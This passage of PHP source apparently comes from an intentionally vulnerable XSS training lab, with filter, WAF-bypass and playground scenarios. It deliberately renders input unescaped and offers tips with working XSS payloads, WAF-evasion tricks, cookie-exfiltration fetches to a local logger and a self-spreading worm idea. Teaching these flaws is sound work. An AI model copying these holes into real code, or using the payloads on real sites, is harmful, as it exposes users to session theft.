    echo '<form method="GET" action="">';
    echo '<input type="hidden" name="page" value="filter">';
    echo '<div class="form-row"><label class="small">Filter level:</label><select name="level" onchange="this.form.submit()"><option value="none" '.($level==='none'?'selected':'').'>none (vulnerable)</option><option value="naive" '.($level==='naive'?'selected':'').'>naive (strip &lt;script&gt; and on* handlers)</option><option value="strip_tags" '.($level==='strip_tags'?'selected':'').'>strip_tags()</option><option value="strip_attributes" '.($level==='strip_attributes'?'selected':'').'>strip attributes (remove on*/style/srcdoc)</option><option value="tag_whitelist" '.($level==='tag_whitelist'?'selected':'').'>tag whitelist (allow basic formatting)</option><option value="regex" '.($level==='regex'?'selected':'').'>regex (remove &lt; &gt; and javascript:)</option><option value="encode" '.($level==='encode'?'selected':'').'>encode (htmlspecialchars)</option><option value="double_encode" '.($level==='double_encode'?'selected':'').'>double encode (nested encoding)</option><option value="json_escape" '.($level==='json_escape'?'selected':'').'>JSON escape (hex encode dangerous chars)</option></select><span class="input-hint">Changes auto-submit so you can compare levels quickly.</span></div>';
    echo '</form>';
    // accept input and show before/after and render result sink
    echo '<form method="POST" action="?page=filter&level='.$levelQuery.'">';
    echo '<input type="hidden" name="level" value="'.htmlspecialchars($level, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'">';
    echo '<div class="form-row"><textarea class="input" name="input" data-field="filter-input" rows="4" placeholder="Try payloads here"></textarea><span class="input-hint">Try: &lt;svg onload=alert(1)&gt;</span></div><div class="form-row"><button class="button">Run through filter</button></div>';
    echo '</form>';
    tip_vault('tips-filter', 7, 'Filter lab decoder ring', [
        [
            'title' => 'Compare every stage',
            'items' => [
                "Paste the same payload across all filter levels (start with <code>&lt;svg onload=alert(1)&gt;</code>) and note how each transformation alters the output.",
                "Use the analysis grid: Raw input tells you what you sent, filtered output shows the defence, and the rendered sink proves whether execution still occurs."
            ]
        ],
        [
            'title' => 'Break specific defences',
            'items' => [
                "For <code>strip_tags</code>, switch to attribute injections like <code>&lt;img src=x onerror=alert(1)&gt;</code>—they survive because the tag remains valid.",
                "For the regex level, use encoded payloads such as <code>&lt;a href=javascript:alert(1)&gt;link&lt;/a&gt;</code> or <code>&lt;img src=data:text/html, &lt;svg/onload=alert(1)&gt;&gt;</code> to dodge simple keyword removal."
            ]
        ],
        [
            'title' => 'Capture learnings',
            'items' => [
                "Record which vectors bypassed each level and move them into the bypass library for quick reference.",
                "Reset to the vulnerable “none” level after testing so you can chain results with the other labs."
            ]
        ]
    ]);
    echo '<div class="meta meta-columns"><div><strong>Challenge scenarios</strong><ol class="lab-steps"><li>Reflected search parameter with <em>strip attributes</em>.</li><li>Profile badge rendered through the <em>tag whitelist</em>.</li><li>JSON config saved with <em>double encoding</em>.</li></ol></div><div><strong>Practice goals</strong><ul class="lab-list"><li>Identify which level leaves enough context for execution.</li><li>Craft a payload that survives the server filter and still executes in the rendered sink.</li><li>Record bypasses to replay in the playground and new WAF lab.</li></ul></div></div>';
    if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['input'])){
        $raw = $_POST['input'];
        $filtered = filter_input_level($raw, $level);
        echo '<div class="meta"><strong>Server-side filter applied:</strong> '.htmlspecialchars($level).'<div class="callout">Does the filtered result still execute? Use the rendered sink to confirm.</div></div>';
        echo '<div class="results"><div class="results-title">Analysis</div><div class="analysis-grid">';
        echo '<div><div class="analysis-label">Raw input</div><div class="bypass-list">'.htmlspecialchars($raw).'</div></div>';
        echo '<div><div class="analysis-label">Filtered output</div><div class="bypass-list">'.htmlspecialchars($filtered).'</div></div>';
        echo '</div>';
        echo '<div class="results-sink"><div class="analysis-label">Rendered sink (unsafe)</div><div class="sink-output">';
        // intentionally render filtered output without encoding to show bypasses
        echo $filtered;
        echo '</div></div></div>';
    }
    footer_html();
    exit;
}

if ($page === 'waf'){
    $wafLevels = ['basic'=>'Basic signature','balanced'=>'Balanced heuristics','paranoid'=>'Paranoid inspection'];
    $wafAwards = ['basic'=>30,'balanced'=>35,'paranoid'=>40];
    $wafLevel = $_REQUEST['waf_level'] ?? 'basic';
    if (!array_key_exists($wafLevel, $wafLevels)){
        $wafLevel = 'basic';
    }
    $payload = $_REQUEST['waf_payload'] ?? '';
    $wafResult = null;
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['waf_payload'])){
        $payload = $_POST['waf_payload'];
        $levelKey = $_POST['waf_level'] ?? $wafLevel;
        if (array_key_exists($levelKey, $wafLevels)){
            $wafLevel = $levelKey;
        }
        $wafResult = waf_process($payload, $wafLevel);
    }
    header_html('WAF bypass lab', 'waf');
    echo '<div class="section"><div class="section-title">Understand the WAF mindset</div><div class="small">Web Application Firewalls inspect requests before they reach the application. Each level below simulates a different inspection strategy so you can rehearse bypass techniques. Study the lecture notes, then prove execution by slipping payloads past increasingly strict checks.</div></div>';
    xp_marker('waf-lecture', 'Reviewed the WAF lecture and strategy notes', 20);
    echo '<div class="meta meta-columns"><div><strong>Lecture essentials</strong><ul class="lab-list"><li><em>Signature engines</em> search for dangerous substrings (e.g. <code>&lt;script&gt;</code>, <code>onload=</code>).</li><li><em>Behavioural rules</em> flag DOM APIs, suspicious keywords, or encoded HTML.</li><li><em>Normalization</em> collapses encodings before inspection—test URL encoding, HTML entities and JSON wrappers.</li></ul></div><div><strong>Bypass playbook</strong><ul class="lab-list"><li>Break signatures with case changes, inserted comments or attribute reordering.</li><li>Hide execution in secondary contexts (SVG, data URIs, template expressions).</li><li>Chain double-encoding or alternate event sources to overwhelm naive checks.</li></ul></div></div>';
    echo '<div class="section"><div class="section-title">Training levels</div><div class="small">Pick a level, craft a payload, and study how the WAF responds. Unlocking each level awards XP so you can track progress across practice sessions.</div></div>';
    echo '<form method="POST" action="?page=waf"><input type="hidden" name="page" value="waf"><div class="form-row"><label class="small">WAF level</label><select name="waf_level">';
    foreach ($wafLevels as $key=>$label){
        $selected = $key === $wafLevel ? ' selected' : '';
        echo '<option value="'.htmlspecialchars($key, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'"'.$selected.'>'.htmlspecialchars($label).'</option>';
    }
    echo '</select><span class="input-hint">Levels reset automatically—switch often to compare behaviours.</span></div>';
    echo '<div class="form-row"><textarea class="input" name="waf_payload" rows="4" placeholder="Payload to send through the WAF">'.htmlspecialchars($payload, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'</textarea><span class="input-hint">Try mixing encodings: <code>&lt;ScRiPt&gt;</code>, <code>&lt;img src=x onerror=</code>, <code>%3Csvg/onload=</code>, etc.</span></div><div class="form-row"><button class="button">Send request</button></div></form>';
    tip_vault('tips-waf', 9, 'WAF bypass blueprint', [
        [
            'title' => 'Recon the defence',
            'items' => [
                'Capture blocked payloads and note which substring triggered the WAF—the response reason below spells it out.',
                'Send benign traffic after a block to confirm if rate limiting or shadow rules activated.'
            ]
        ],
        [
            'title' => 'Evade signatures',
            'items' => [
                'Split keywords with comments: <code>&lt;sc<!-- -->ript&gt;</code> or <code>ja\x76ascript:</code>.',
                'Wrap payloads in harmless markup, then use DOM APIs to decode and execute once inside the browser.'
            ]
        ],
        [
            'title' => 'Escalate impact',
            'items' => [
                'Once a level is bypassed, weaponise it: trigger the blind logger, steal cookies, or pivot to CSRF.',
                'Document which normalisations were required so you can reproduce the bypass against real appliances.'
            ]
        ]
    ]);
    echo '<div class="meta meta-columns"><div><strong>Practice scenarios</strong><ol class="lab-steps"><li>Basic signature WAF (Level 1)</li><li>Balanced heuristic WAF (Level 2)</li><li>Paranoid inspection with aggressive blocking (Level 3)</li></ol></div><div><strong>Success criteria</strong><ul class="lab-list"><li>Find a payload that executes for each level without being blocked.</li><li>Record how you normalized the payload (double-encoding, alternate tags, etc.).</li><li>Explain why the bypass worked so you can transfer it to other labs.</li></ul></div></div>';
    if ($wafResult){
        $statusClass = $wafResult['allowed'] ? 'is-success' : 'is-danger';
        $statusText = $wafResult['allowed'] ? 'Allowed' : 'Blocked';
        echo '<div class="results"><div class="results-title">WAF verdict</div><div class="callout '.$statusClass.'"><strong>'.$statusText.'</strong> — '.htmlspecialchars($wafResult['reason']).'</div>';
        if (!empty($wafResult['triggers'])){
            echo '<div class="small">Triggered rules:</div><ul class="lab-list">';
            foreach ($wafResult['triggers'] as $trigger){
                echo '<li>'.htmlspecialchars($trigger).'</li>';
            }
            echo '</ul>';
        }
        echo '<div class="analysis-grid"><div><div class="analysis-label">Original payload</div><div class="bypass-list">'.htmlspecialchars($payload).'</div></div><div><div class="analysis-label">Transformed request</div><div class="bypass-list">'.htmlspecialchars($wafResult['transformed']).'</div></div></div>';
        echo '<div class="analysis-label">Rendered sink (unsafe)</div><div class="sink-output">';
        if ($wafResult['allowed']){
            echo $wafResult['transformed'];
            $markerId = 'waf-'.$wafLevel.'-bypass';
            $awardAmount = $wafAwards[$wafLevel] ?? 30;
            echo '<script>document.dispatchEvent(new CustomEvent("lab:solved", { detail: { id: "'.htmlspecialchars($markerId, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'", amount: '.intval($awardAmount).' } }));</script>';
        } else {
            echo htmlspecialchars($wafResult['transformed']);
        }
        echo '</div></div>';
    }
    xp_marker('waf-basic-bypass', 'Bypassed the basic WAF level', 30);
    xp_marker('waf-balanced-bypass', 'Bypassed the balanced WAF level', 35);
    xp_marker('waf-paranoid-bypass', 'Bypassed the paranoid WAF level', 40);
    footer_html();
    exit;
}

if ($page === 'playground'){
    $activeScenario = $_REQUEST['scenario_view'] ?? 's1';
    if (!preg_match('/^s\d+$/', $activeScenario)){
        $activeScenario = 's1';
    }
    header_html('Practice playground', 'playground');
    echo '<div class="section"><div class="section-title">Put the concepts to work</div><div class="small">Use these miniature applications to rehearse exploitation outside of the guided steps. Each scenario mirrors a real bug class and encourages you to apply reconnaissance, payload crafting and impact demonstration.</div></div>';
    echo '<div class="section"><div class="section-title">How to approach the playground</div><ol class="lab-steps"><li>Skim the brief and predict where user input will land.</li><li>Attempt benign probes (<code>test</code>, <code>&lt;em&gt;</code>, quotes) before escalating.</li><li>Record working payloads and why they succeed—think about DOM vs. server rendering.</li><li>Reset the page with different payload styles (HTML, attribute, URL) to cement the concept.</li></ol></div>';
    echo '<div class="playground-tabs" data-scenario-tabs data-active="'.htmlspecialchars($activeScenario, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'"></div>';
    echo '<div class="playground-stack" data-scenario-stack>';

    // Scenario 1: reflected search widget
    $reflect = $_GET['reflect'] ?? '';
    echo '<div class="card scenario" data-scenario-id="s1" data-scenario-index="1" data-scenario-award="playground-s1" data-scenario-requires="">';
    echo '<div class="section-title">Scenario 1: Help centre search (reflected)</div>';
    echo '<div class="small">A support portal echoes the <code>q</code> parameter when no results are found. Demonstrate how reflected input leads to execution.</div>';
    xp_marker('playground-s1', 'Solved Scenario 1: Help centre search', 25);
    echo '<form method="GET" action="?"><input type="hidden" name="page" value="playground"><input type="hidden" name="scenario_view" value="s1"><div class="form-row"><input class="input" name="reflect" data-field="reflect" placeholder="Search query"><span class="input-hint">Start with plain text, then try markup like &lt;img src onerror=alert(1)&gt;</span></div><div class="form-row"><button class="button">Search</button></div></form>';
    echo '<div class="meta"><div class="meta-item" data-field="reflect"><strong>Investigation tips</strong><div class="small">View source after submitting. The query is injected inside a <code>&lt;div&gt;</code> without encoding, so HTML payloads execute immediately.</div></div></div>';
    tip_vault('tips-playground-s1', 6, 'Scenario 1 quick win plan', [
        [
            'title' => 'Confirm the reflection',
            'items' => [
                "Submit <code>?page=playground&amp;reflect=%3Cprobe%3E</code> and check the Network response to see your marker echoed.",
                "Use the Elements panel to locate the <code>results-body</code> div—the entire query is dropped inside without escaping."
            ]
        ],
        [
            'title' => 'Trigger execution',
            'items' => [
                "Run <code>&lt;img src=x onerror=alert('S1')&gt;</code>. The broken image fires immediately because attributes are not sanitized.",
                "Alternatively, close the surrounding text with <code>&lt;/div&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code> to demonstrate script execution."
            ]
        ],
        [
            'title' => 'Document impact',
            'items' => [
                "Swap <code>alert</code> for a <code>fetch</code> call to <code>/blind_logger.php</code> so you can prove data theft.",
                "Record the working payload—you will reuse it when tackling the main Reflected lab."
            ]
        ]
    ]);
    echo '<div class="results"><div class="results-title">Search response</div><div class="results-body">';
    if ($reflect !== ''){
        echo 'No results for: '.$reflect; // intentionally unsafe
    } else {
        echo '(Submit a query to see the reflection)';
    }
    echo '</div></div>';
    echo '</div>';

    // Scenario 2: community comment wall (stored)
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['scenario'] ?? '') === 'comment_wall'){
        $name = trim($_POST['name'] ?? '');
        $message = $_POST['message'] ?? '';
        $payload = json_encode(['name'=>$name,'message'=>$message], JSON_UNESCAPED_UNICODE);
        $stmt = $db->prepare('INSERT INTO playground_entries (scenario, content) VALUES (:scenario, :content)');
        $stmt->execute([':scenario'=>'comment_wall', ':content'=>$payload]);
        echo '<div class="notice success">Comment saved to the wall. Reload the page to observe stored execution.</div>';
    }
    $commentStmt = $db->prepare('SELECT id, created_at, content FROM playground_entries WHERE scenario = :scenario ORDER BY id DESC LIMIT 25');
    $commentStmt->execute([':scenario'=>'comment_wall']);
    $commentRows = $commentStmt->fetchAll(PDO::FETCH_ASSOC);
    echo '<div class="card scenario" data-scenario-id="s2" data-scenario-index="2" data-scenario-award="playground-s2" data-scenario-requires="playground-s1">';
    echo '<div class="section-title">Scenario 2: Community shoutbox (stored)</div>';
    echo '<div class="small">Messages persist in the database and display for every visitor. Abuse the body field to deliver a self-firing payload.</div>';
    xp_marker('playground-s2', 'Stored payload in Scenario 2 shoutbox', 30);
    echo '<form method="POST" action="?page=playground"><input type="hidden" name="scenario" value="comment_wall"><input type="hidden" name="scenario_view" value="s2"><div class="form-row"><input class="input" name="name" data-field="pg-name" placeholder="Display name"><span class="input-hint">Your name is encoded safely.</span></div><div class="form-row"><textarea class="input" name="message" data-field="pg-message" rows="3" placeholder="Message (HTML allowed)"></textarea><span class="input-hint">Stored payload idea: &lt;script&gt;alert(\'stored\')&lt;/script&gt;</span></div><div class="form-row"><button class="button">Post message</button></div></form>';
    echo '<div class="meta meta-columns"><div class="meta-item" data-field="pg-message"><strong>Recon questions</strong><ul class="lab-list"><li>Does the body render with <code>innerHTML</code> or server-side templating?</li><li>Can you craft a payload that steals another visitor&apos;s cookies?</li><li>What happens if you add an auto-submitting form to spread the worm?</li></ul></div><div><strong>Recent shoutbox entries</strong><div class="small">Everything below is rendered without sanitisation—perfect for verifying stored XSS.</div></div></div>';
    tip_vault('tips-playground-s2', 7, 'Scenario 2 execution steps', [
        [
            'title' => 'Store a baseline',
            'items' => [
                "Submit a friendly message first and refresh to confirm persistence.",
                "Observe how your entry renders inside <code>.wall-entry</code> with no escaping—the body is trusted HTML."
            ]
        ],
        [
            'title' => 'Upgrade to XSS',
            'items' => [
                "Post <code>&lt;script&gt;alert('S2')&lt;/script&gt;</code> in the message body to demonstrate execution on every page load.",
                "Follow up with a stealthier <code>&lt;img src=x onerror=fetch('/blind_logger.php?p='+document.cookie)&gt;</code> payload to leak cookies."
            ]
        ],
        [
            'title' => 'Simulate a worm',
            'items' => [
                "Build a payload that auto-submits a new entry via <code>fetch('/?page=playground', { method: 'POST', body: ... })</code> to show lateral spread.",
                "Log successful payloads so you can reuse them in the main Stored lab and Scenario 7 later."
            ]
        ]
    ]);
    echo '<div class="results"><div class="results-title">Wall feed</div>';
    foreach ($commentRows as $row){
        $decoded = json_decode($row['content'], true);
        $name = htmlspecialchars($decoded['name'] ?? 'Anonymous');
        $message = $decoded['message'] ?? '';
        echo '<div class="wall-entry"><div class="small">#'.intval($row['id']).' • '.htmlspecialchars($row['created_at']).' • <strong>'.$name.'</strong></div><div class="wall-body">'.$message.'</div></div>';
    }
    if (count($commentRows) === 0){
        echo '<div class="small">No entries yet. Be the first to store something.</div>';
    }
    echo '</div>';
    echo '</div>';

    // Scenario 3: client-side personalization (DOM)
    echo '<div class="card scenario" data-scenario-id="s3" data-scenario-index="3" data-scenario-award="playground-s3" data-scenario-requires="playground-s2">';
    echo '<div class="section-title">Scenario 3: Personalised dashboard (DOM)</div>';
    echo '<div class="small">A dashboard stores your preferences in <code>localStorage</code> and uses them to build widgets with <code>innerHTML</code>. Tamper with the data to execute arbitrary scripts when the widget renders.</div>';
    xp_marker('playground-s3', 'Exploded Scenario 3 dashboard widget', 30);
    echo '<div class="form-row"><input class="input" id="playground-widget" data-field="pg-dom" placeholder="Widget title or payload"><span class="input-hint">Tip: payloads should be URL encoded when modifying storage manually.</span></div>';
    echo '<div class="form-row"><button class="button" id="pg-save">Save preference</button><button class="button" id="pg-clear" style="background:rgba(255,255,255,0.1);color:#fff">Reset</button></div>';
    echo '<div class="meta"><div class="meta-item" data-field="pg-dom"><strong>Experiment ideas</strong><div class="small">Open DevTools → Application → Local Storage. Edit <code>dashboard_widget</code> to inject HTML such as <code>&lt;img src onerror=alert(document.domain)&gt;</code> then refresh the page.</div></div></div>';
    tip_vault('tips-playground-s3', 7, 'Scenario 3 DOM guide', [
        [
            'title' => 'Inspect the sink',
            'items' => [
                "Check the inline script: it pulls <code>localStorage.getItem('dashboard_widget')</code>, decodes it, and assigns to <code>innerHTML</code>.",
                "Run <code>localStorage.setItem('dashboard_widget', encodeURIComponent('&lt;h3&gt;Injected&lt;/h3&gt;'))</code> in the Console to see how the widget updates instantly."
            ]
        ],
        [
            'title' => 'Exploit the storage',
            'items' => [
                "Set the value to <code>&lt;img src=x onerror=alert('S3')&gt;</code> using the input or Application tab; refresh to trigger the payload.",
                "Because the value is URL-encoded, remember to call <code>encodeURIComponent</code> when writing via the Console."
            ]
        ],
        [
            'title' => 'Extend the attack',
            'items' => [
                "Store a payload that reads <code>localStorage</code> keys or cookies and exfiltrates them to <code>/blind_logger.php</code>.",
                "Reuse this vector when tackling Playground Scenario 12, which also decodes hash fragments into <code>innerHTML</code>."
            ]
        ]
    ]);
    echo '<div class="results"><div class="results-title">Rendered widget</div><div id="pg-widget-output" class="results-body">(No widget stored yet)</div></div>';
    echo '<script>(function(){
        var input = document.getElementById("playground-widget");
        var output = document.getElementById("pg-widget-output");
        var saveBtn = document.getElementById("pg-save");
        var clearBtn = document.getElementById("pg-clear");
        function render(){
            var saved = localStorage.getItem("dashboard_widget");
            if (saved){
                output.innerHTML = decodeURIComponent(saved);
            } else {
                output.textContent = "(No widget stored yet)";
            }
        }
        saveBtn.addEventListener("click", function(e){
            e.preventDefault();
            localStorage.setItem("dashboard_widget", encodeURIComponent(input.value));
            render();
        });
        clearBtn.addEventListener("click", function(e){
            e.preventDefault();
            localStorage.removeItem("dashboard_widget");
            render();
        });
        render();
    })();</script>';
    echo '</div>';

    // Scenario 4: attribute injection badge (easy)
    $badge = $_GET['badge'] ?? '';
    echo '<div class="card scenario" data-scenario-id="s4" data-scenario-index="4" data-scenario-award="playground-s4" data-scenario-requires="playground-s3">';
    echo '<div class="section-title">Scenario 4 (Easy): Profile badge (attribute reflection)</div>';
    echo '<div class="small">Marketing wants dynamic badges. The value you supply is copied into multiple HTML attributes without escaping. Break out of the attribute to hijack the markup.</div>';
    xp_marker('playground-s4', 'Escaped Scenario 4 profile badge attributes', 25);
    echo '<form method="GET" action="?"><input type="hidden" name="page" value="playground"><input type="hidden" name="scenario_view" value="s4"><div class="form-row"><input class="input" name="badge" value="'.htmlspecialchars($badge, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'" placeholder="Badge text or payload"><span class="input-hint">Try closing the attribute with <code>"</code> then injecting <code>onmouseover</code>.</span></div><div class="form-row"><button class="button">Render badge</button></div></form>';
    echo '<div class="meta"><strong>Recon focus</strong><div class="small">Inspect the HTML to see how the value lands inside <code>title</code> and <code>data-badge</code> attributes. Attribute context payloads often need quotes and whitespace tricks.</div></div>';
    tip_vault('tips-playground-s4', 6, 'Scenario 4 attribute cheats', [
        [
            'title' => 'See where the value lands',
            'items' => [
                "View source or use DevTools → Elements to confirm your input populates both <code>title</code> and <code>data-badge</code> attributes.",
                "Notice the preview text <code>Champion VALUE</code>—you can close the attribute and inject new HTML right before it."
            ]
        ],
        [
            'title' => 'Break the attribute safely',
            'items' => [
                "Enter <code>&quot; onmouseover=alert('S4') x=&quot;</code> to close the <code>title</code> attribute, add an event handler, and reopen the attribute.",
                "Alternatively, use <code>&quot; autofocus onfocus=alert('S4')</code> to trigger when the badge receives focus."
            ]
        ],
        [
            'title' => 'Escalate impact',
            'items' => [
                "Point the payload at <code>fetch('/blind_logger.php?p='+encodeURIComponent(document.cookie))</code> to capture visitor data.",
                "Try adding a closing tag (<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>) to replace the badge entirely."
            ]
        ]
    ]);
    echo '<div class="results"><div class="results-title">Badge preview</div><div class="results-body"><div class="badge-preview" title="'.$badge.'" data-badge="'.$badge.'">Champion '.$badge.'</div></div></div>';
    echo '</div>';

    // Scenario 5: inline script preview (easy -> medium)
    $landingHeadline = '';
    $landingSubhead = '';
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['scenario'] ?? '') === 'landing_preview'){
        $landingHeadline = $_POST['headline'] ?? '';
        $landingSubhead = $_POST['subhead'] ?? '';
    }
    echo '<div class="card scenario" data-scenario-id="s5" data-scenario-index="5" data-scenario-award="playground-s5" data-scenario-requires="playground-s4">';
    echo '<div class="section-title">Scenario 5 (Easy→Medium): Landing page preview (inline script)</div>';
    echo '<div class="small">The product team writes copy and previews it instantly. Inputs are concatenated into a JavaScript string and pushed into <code>innerHTML</code> without encoding.</div>';
    xp_marker('playground-s5', 'Broke out of Scenario 5 inline script', 30);
    echo '<form method="POST" action="?page=playground"><input type="hidden" name="scenario" value="landing_preview"><input type="hidden" name="scenario_view" value="s5"><div class="form-row"><input class="input" name="headline" value="'.htmlspecialchars($landingHeadline, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'" placeholder="Headline"><span class="input-hint">Inject <code>";alert(1);//</code> to escape the string.</span></div><div class="form-row"><input class="input" name="subhead" value="'.htmlspecialchars($landingSubhead, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'" placeholder="Sub headline"><span class="input-hint">Experiment with closing tags like <code>&lt;/h3&gt;</code>.</span></div><div class="form-row"><button class="button">Preview copy</button></div></form>';
    tip_vault('tips-playground-s5', 7, 'Scenario 5 inline script tips', [
        [
            'title' => 'Read the vulnerable code',
            'items' => [
                "Look at the inline script below the preview: it concatenates <code>&quot; + landingHeadline + &quot;</code> into an HTML string without escaping.",
                "Identify both variables (<code>headline</code> and <code>subhead</code>)—either one can break the string."
            ]
        ],
        [
            'title' => 'Break out of the JS string',
            'items' => [
                "Set the headline to <code>&quot;;alert('S5');//</code> to terminate the string, execute code, and comment out the remainder.",
                "Use the subhead to inject HTML by closing <code>&lt;p&gt;</code> and appending <code>&lt;script&gt;</code> tags."
            ]
        ],
        [
            'title' => 'Prove real impact',
            'items' => [
                "Exfiltrate cookies with <code>fetch('/blind_logger.php?p='+encodeURIComponent(document.cookie))</code> once you have string execution.",
                "Capture the working payload for reuse in Scenario 9, which shares the same inline-JS concatenation flaw."
            ]
        ]
    ]);
    echo '<div class="results"><div class="results-title">Preview output</div><div id="landing-preview" class="results-body">(Submit copy to build the preview)</div></div>';
    if ($landingHeadline !== '' || $landingSubhead !== ''){
        echo '<script>var landingHeadline = "'.$landingHeadline.'";var landingSubhead = "'.$landingSubhead.'";document.getElementById("landing-preview").innerHTML = "<h3>" + landingHeadline + "</h3><p>" + landingSubhead + "</p>";</script>';
    }
    echo '</div>';

    // Scenario 6: markdown previewer with naive filtering (medium)
    $markdownInput = '';
    $markdownFiltered = null;
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['scenario'] ?? '') === 'markdown_preview'){
        $markdownInput = $_POST['markdown'] ?? '';
        $markdownFiltered = filter_input_level($markdownInput, 'naive');
    }
    echo '<div class="card scenario" data-scenario-id="s6" data-scenario-index="6" data-scenario-award="playground-s6" data-scenario-requires="playground-s5">';
    echo '<div class="section-title">Scenario 6 (Medium): Markdown helper with naive sanitiser</div>';
    echo '<div class="small">Writers can preview Markdown, but the sanitiser only strips <code>&lt;script&gt;</code> tags and obvious <code>on*</code> attributes. Discover vectors that slip through.</div>';
    xp_marker('playground-s6', 'Defeated Scenario 6 markdown sanitiser', 35);
    echo '<form method="POST" action="?page=playground"><input type="hidden" name="scenario" value="markdown_preview"><input type="hidden" name="scenario_view" value="s6"><div class="form-row"><textarea class="input" name="markdown" rows="4" placeholder="Markdown or payload">'.htmlspecialchars($markdownInput, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'</textarea><span class="input-hint">Hint: SVG <code>onload</code> survives the naive filter.</span></div><div class="form-row"><button class="button">Render preview</button></div></form>';
    tip_vault('tips-playground-s6', 7, 'Scenario 6 sanitiser plan', [
        [
            'title' => 'Test the filter boundaries',
            'items' => [
                "Start with <code>&lt;script&gt;</code> and note it disappears—confirming the filter only strips obvious tags.",
                "Switch to <code>&lt;svg onload=alert('S6')&gt;</code>; it survives because SVG tags are not removed by the naive rule."
            ]
        ],
        [
            'title' => 'Abuse Markdown features',
            'items' => [
                "Try injecting Markdown links like <code>[click](javascript:alert(1))</code> to slip JavaScript URLs past the sanitizer.",
                "Combine Markdown italics with HTML tags (<code>*&lt;img src=x onerror=alert(1)&gt;*</code>)—the parser keeps the HTML intact."
            ]
        ],
        [
            'title' => 'Capture findings',
            'items' => [
                "Log which payloads remained in the “Filtered output” column and executed in the preview block.",
                "Reuse successful vectors in the Filter Lab when testing the <code>naive</code> level to confirm consistency."
            ]
        ]
    ]);
    if ($markdownFiltered !== null){
        echo '<div class="results"><div class="results-title">Sanitiser analysis</div><div class="analysis-grid"><div><div class="analysis-label">Raw input</div><div class="bypass-list">'.htmlspecialchars($markdownInput, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'</div></div><div><div class="analysis-label">Filtered output</div><div class="bypass-list">'.htmlspecialchars($markdownFiltered, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'</div></div></div><div class="results-sink"><div class="analysis-label">Rendered preview</div><div class="sink-output">'.$markdownFiltered.'</div></div></div>';
    }
    echo '</div>';

    // Scenario 7: stored support chat with double decoding (medium)
    $supportChatNotice = '';
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['scenario'] ?? '') === 'support_chat'){
        $agent = trim($_POST['agent'] ?? '');
        $chatMessage = $_POST['chat_message'] ?? '';
        $payload = json_encode(['agent'=>$agent,'message'=>$chatMessage], JSON_UNESCAPED_UNICODE);
        $stmt = $db->prepare('INSERT INTO playground_entries (scenario, content) VALUES (:scenario, :content)');
        $stmt->execute([':scenario'=>'support_chat', ':content'=>$payload]);
        $supportChatNotice = '<div class="notice success">Transcript updated. The viewer will decode the content twice—perfect for encoded payloads.</div>';
    }
    $supportStmt = $db->prepare('SELECT id, created_at, content FROM playground_entries WHERE scenario = :scenario ORDER BY id DESC LIMIT 20');
    $supportStmt->execute([':scenario'=>'support_chat']);
    $supportRows = $supportStmt->fetchAll(PDO::FETCH_ASSOC);
    echo '<div class="card scenario" data-scenario-id="s7" data-scenario-index="7" data-scenario-award="playground-s7" data-scenario-requires="playground-s6">';
    echo '<div class="section-title">Scenario 7 (Medium): Support chat transcript (stored)</div>';
    echo '<div class="small">Logs are kept for audits. Operators paste URL-encoded payloads which the viewer <code>urldecode</code>s twice before display.</div>';
    xp_marker('playground-s7', 'Weaponised Scenario 7 support transcript', 35);
    if ($supportChatNotice !== ''){
        echo $supportChatNotice;
    }
    echo '<form method="POST" action="?page=playground"><input type="hidden" name="scenario" value="support_chat"><input type="hidden" name="scenario_view" value="s7"><div class="form-row"><input class="input" name="agent" placeholder="Agent name"><span class="input-hint">Agent names are encoded safely.</span></div><div class="form-row"><textarea class="input" name="chat_message" rows="3" placeholder="Chat message (will be double decoded)"></textarea><span class="input-hint">Tip: store <code>%253Csvg/onload=alert(1)%253E</code>.</span></div><div class="form-row"><button class="button">Append message</button></div></form>';
    echo '<div class="results"><div class="results-title">Transcript viewer</div>';
    if (count($supportRows) === 0){
        echo '<div class="small">No support chats yet. Seed one with an encoded payload.</div>';
    }
    tip_vault('tips-playground-s7', 8, 'Scenario 7 double-decode guide', [
        [
            'title' => 'Confirm the decoding flow',
            'items' => [
                "Submit <code>%253Cstrong%253Ehi%253C/strong%253E</code> and observe how the viewer decodes twice, rendering <code>&lt;strong&gt;</code> tags.",
                "Check the PHP snippet: it runs <code>rawurldecode</code> twice before output—anything double-encoded will revive."
            ]
        ],
        [
            'title' => 'Deliver the payload',
            'items' => [
                "Store <code>%253Csvg/onload=alert('S7')%253E</code> to execute JavaScript when the transcript renders.",
                "Experiment with <code>%2522%253E&lt;script&gt;alert(1)&lt;/script&gt;</code> to break attributes after decoding."
            ]
        ],
        [
            'title' => 'Escalate impact',
            'items' => [
                "Send two entries: one to create the payload and another to simulate victim access—note the stored attack persists.",
                "Replace <code>alert</code> with a fetch to <code>/blind_logger.php</code> so you can capture victim cookies."
            ]
        ]
    ]);
    foreach ($supportRows as $row){
        $decoded = json_decode($row['content'], true);
        $agentName = htmlspecialchars($decoded['agent'] ?? 'Anon');
        $messageRaw = $decoded['message'] ?? '';
        $rendered = rawurldecode(rawurldecode($messageRaw));
        echo '<div class="wall-entry"><div class="small">#'.intval($row['id']).' • '.htmlspecialchars($row['created_at']).' • <strong>'.$agentName.'</strong></div><div class="wall-body">'.$rendered.'</div></div>';
    }
    echo '</div>';
    echo '</div>';

    // Scenario 8: DOM widget via query parameter (medium-hard)
    $widget = $_GET['widget'] ?? '';
